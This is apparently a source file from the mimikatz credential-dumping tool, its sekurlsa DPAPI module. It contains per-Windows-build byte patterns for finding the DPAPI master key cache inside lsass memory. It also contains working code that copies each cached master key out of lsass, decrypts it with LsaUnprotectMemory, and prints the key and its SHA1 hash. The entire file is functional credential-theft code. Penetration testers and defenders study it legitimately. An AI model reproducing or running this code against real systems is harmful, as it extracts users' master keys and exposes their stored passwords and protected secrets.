/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_dpapi.h"

#if defined(_M_ARM64)
BYTE PTRN_WI64_1803_MasterKeyCacheList[] = {0x09, 0xfd, 0xdf, 0xc8, 0x80, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6};
KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI64_1803_MasterKeyCacheList),	PTRN_WI64_1803_MasterKeyCacheList},	{0, NULL}, {16, 8}},
};
#elif defined(_M_X64)
BYTE PTRN_W2K3_MasterKeyCacheList[]	= {0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85};
BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84};
BYTE PTRN_WI61_MasterKeyCacheList[]	= {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}; // InitializeKeyCache to avoid  version change
BYTE PTRN_WI62_MasterKeyCacheList[]	= {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
BYTE PTRN_WI63_MasterKeyCacheList[]	= {0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
BYTE PTRN_WI64_MasterKeyCacheList[]	= {0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08};
BYTE PTRN_WI64_1607_MasterKeyCacheList[]	= {0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08};
										 
KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_MasterKeyCacheList),	PTRN_W2K3_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-10}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84};
KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},// ?
	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
};
#endif

PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = {L"dpapi", NULL, FALSE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = {L"dpapi", NULL, FALSE, L"dpapisrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};

NTSTATUS kuhl_m_sekurlsa_dpapi(int argc, wchar_t * argv[])
{
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_dpapi, NULL);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aKey = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsass = {NULL, pData->cLsass->hLsassMem};
	PKUHL_M_SEKURLSA_PACKAGE pPackage = (pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
	BYTE dgst[SHA_DIGEST_LENGTH];
	DWORD monNb = 0;

	if(pData->LogonType != Network)
	{
		kuhl_m_sekurlsa_printinfos_logonData(pData);
		if(pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID *) &pMasterKeyCacheList, NULL, NULL, NULL))
		{
			aLsass.address = pMasterKeyCacheList;
			if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
			{
				aLsass.address = mesCredentials.Flink;
				while(aLsass.address != pMasterKeyCacheList)
				{
					if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_MASTERKEY_CACHE_ENTRY)))
					{
						if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
						{
							kprintf(L"\t [%08x]\n\t * GUID      :\t", monNb++);
							kull_m_string_displayGUID(&mesCredentials.KeyUid);
							kprintf(L"\n\t * Time      :\t"); kull_m_string_displayLocalFileTime(&mesCredentials.insertTime);

							if(aKey.address = LocalAlloc(LPTR, mesCredentials.keySize))
							{
								aLsass.address = (PBYTE) aLsass.address + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key);
								if(kull_m_memory_copy(&aKey, &aLsass, mesCredentials.keySize))
								{
									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
									{
										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
										kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, dgst, SHA_DIGEST_LENGTH);
									}
								}
								LocalFree(aKey.address);
							}
							kprintf(L"\n");
						}
						aLsass.address = mesCredentials.Flink;
					}
					else break;
				}
			}
		} else kprintf(L"\n\tKO");
		kprintf(L"\n");
	}
	return TRUE;
}